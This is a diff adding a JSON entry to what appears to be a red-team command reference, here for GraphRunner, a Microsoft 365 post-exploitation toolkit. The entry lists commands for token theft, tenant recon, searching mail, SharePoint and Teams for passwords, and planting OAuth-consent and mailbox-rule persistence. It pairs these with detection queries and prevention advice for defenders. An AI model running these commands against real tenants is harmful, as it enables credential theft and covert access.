@@ -1,0 +1,105 @@
+{
+  "id": "cloud-graphrunner",
+  "name": "GraphRunner - M365 Graph Post-Exploitation",
+  "command": "Import-Module GraphRunner.ps1; Get-GraphTokens",
+  "description": "GraphRunner is a post-compromise toolset for Microsoft Graph. With a user token it enumerates the tenant, searches mail/SharePoint/OneDrive/Teams for secrets, abuses app registrations and consent, deploys persistence (malicious app, mailbox rules, OneDrive pillage), and runs an interactive GUI. Built for operating as a compromised user through Graph alone.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Cloud Security",
+  "subcategory": "Azure Attacks",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "dafthack/GraphRunner",
+  "tags": [
+    "graphrunner",
+    "azure",
+    "m365",
+    "msgraph",
+    "post-exploitation",
+    "consent",
+    "persistence"
+  ],
+  "mitre": [
+    "T1114",
+    "T1098.003",
+    "T1534"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== LOAD ===\n  . .\\GraphRunner.ps1\n\n=== GET / REFRESH TOKENS ===\n  Get-GraphTokens                 # device-code flow -> $tokens\n  Invoke-RefreshGraphTokens       # keep tokens alive\n\n=== RECON ===\n  Invoke-GraphRecon -Tokens $tokens        # org, roles, CA policies, app info\n  Get-AzureADUsers -Tokens $tokens -OutFile users.txt\n  Get-SecurityGroups -Tokens $tokens\n  Get-UpdatableGroups -Tokens $tokens       # self-add to groups\n\n=== LOOT (search everything) ===\n  Invoke-SearchMailbox   -Tokens $tokens -SearchTerm \"password\" -MessageCount 50\n  Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm \"passw\"\n  Invoke-SearchTeams     -Tokens $tokens -SearchTerm \"secret\"\n\n=== PERSISTENCE / ABUSE ===\n  Invoke-InjectOAuthApp  -Tokens $tokens -AppName \"Perf\" -ReplyUrl ...   # consent-grant backdoor\n  Invoke-AddGroupMember  -Tokens $tokens -GroupId <id> -UserId <id>\n  New-MailboxRule via Graph (hide/forward)\n\n=== GUI ===\n  Invoke-GraphRunnerGUI\n\n=== ALTERNATIVES ===\n  TokenTactics    # token minting\n  AADInternals    # broader Entra/ADFS attacks\n  ROADrecon       # offline enumeration",
+  "examples": [
+    {
+      "label": "Get Graph tokens (device code)",
+      "command": "Get-GraphTokens"
+    },
+    {
+      "label": "Search mailbox for passwords",
+      "command": "Invoke-SearchMailbox -Tokens $tokens -SearchTerm password -MessageCount 50"
+    },
+    {
+      "label": "Recon the tenant",
+      "command": "Invoke-GraphRecon -Tokens $tokens"
+    }
+  ],
+  "references": [
+    {
+      "title": "GraphRunner",
+      "url": "https://github.com/dafthack/GraphRunner"
+    },
+    {
+      "title": "MITRE T1114 - Email Collection",
+      "url": "https://attack.mitre.org/techniques/T1114/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "cloud-tokentactics",
+      "note": "TokenTactics to mint/refresh the tokens GraphRunner uses.",
+      "rel": "prereq"
+    },
+    {
+      "id": "cloud-aadinternals",
+      "note": "AADInternals for deeper Entra/ADFS attacks.",
+      "rel": "alternative"
+    },
+    {
+      "id": "azure-app-credential-abuse",
+      "note": "App/consent abuse overlaps with OAuth app injection.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Microsoft Graph exposes mail, files, Teams, groups, and app management behind one token scope set. A compromised user token lets an attacker read and act across all of M365 using sanctioned API calls that blend with normal client traffic.",
+    "prerequisites": "A valid Graph access/refresh token for a user (device-code phish or token theft). Some actions need specific delegated scopes or admin/consent rights.",
+    "impact": "Mass secret discovery across mailboxes/SharePoint/Teams, self-escalation into groups, OAuth-app consent backdoors, and mailbox-rule persistence.",
+    "detection": "[MITRE T1114/T1098.003] Graph search API bursts across many mailboxes/sites; new OAuth app registrations with consent grants; new inbox rules; group membership self-additions; device-code sign-ins.",
+    "artifacts": "Entra audit logs (Add app, Consent to application, Add member to group), Exchange audit (New-InboxRule, mailbox searches), MSGraph activity logs, unified audit log SearchQueryInitiatedExchange.",
+    "splunk_spl": "index=o365 (Operation=\"Add service principal.\" OR Operation=\"Consent to application.\" OR Operation=\"New-InboxRule\" OR Operation=\"Add member to group.\")\n| stats count by UserId, Operation, ClientIP",
+    "elastic_kql": "o365.audit.Operation:(\"Consent to application.\" or \"New-InboxRule\" or \"Add member to group.\")",
+    "sentinel_kql": "OfficeActivity\n| where Operation in (\"Add service principal.\",\"Consent to application.\",\"New-InboxRule\",\"Add member to group.\")\n| project TimeGenerated, UserId, Operation, ClientIP, Parameters",
+    "sigma_rules": "o365_graphrunner_consent_and_rule_persistence",
+    "prevention": "Restrict user consent to verified publishers only; admin-consent workflow; disable device-code where unused; alert on new inbox-forwarding rules and app consents; least-privilege Graph scopes; Conditional Access on Graph-using apps.",
+    "sources": [
+      "dafthack/GraphRunner",
+      "https://attack.mitre.org/techniques/T1114/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "OAuth app consent + persistence burst (GraphRunner)",
+        "logic": "OfficeActivity\n| where Operation in (\"Add service principal.\",\"Consent to application.\",\"New-InboxRule\",\"Add member to group.\")\n| summarize Ops=make_set(Operation), Count=count() by UserId, ClientIP, bin(TimeGenerated, 1h)\n| where Count > 2",
+        "data_source": "o365",
+        "attack": [
+          "T1098.003",
+          "T1114"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Admins onboarding apps; mail-rule power users",
+        "tuning": "Exclude admin accounts in change windows; focus on non-admin UPNs"
+      }
+    ]
+  }
+}
